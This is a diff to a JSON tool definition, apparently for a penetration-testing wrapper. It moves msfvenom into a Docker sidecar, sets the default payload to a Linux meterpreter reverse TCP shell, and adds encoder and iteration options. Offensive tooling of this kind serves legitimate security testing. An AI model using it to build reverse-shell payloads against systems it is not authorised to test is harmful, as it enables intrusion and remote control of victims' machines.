@@ -1,14 +1,17 @@
 {
-  "binary": "msfvenom",
+  "binary": "docker",
+  "backend": "docker",
+  "container": "hexstrike-linux",
+  "container_binary": "msfvenom",
   "category": "exploitation",
-  "description": "Payload generator and encoder",
+  "description": "Payload generator and encoder (Linux sidecar)",
   "timeout": 120,
   "command": [
     "msfvenom",
     "-p",
     {
       "param": "payload",
-      "default": "linux/x86/meterpreter/reverse_tcp"
+      "default": "linux/x64/meterpreter_reverse_tcp"
     },
     {
       "param": "lhost",
@@ -23,11 +26,22 @@
     },
     {
       "param": "format",
+      "alt_param": "format_type",
       "flag": "-f"
     },
     {
       "param": "output",
+      "alt_param": "output_file",
       "flag": "-o"
+    },
+    {
+      "param": "encoder",
+      "flag": "-e",
+      "quote": true
+    },
+    {
+      "param": "iterations",
+      "flag": "-i"
     },
     {
       "param": "additional_args"
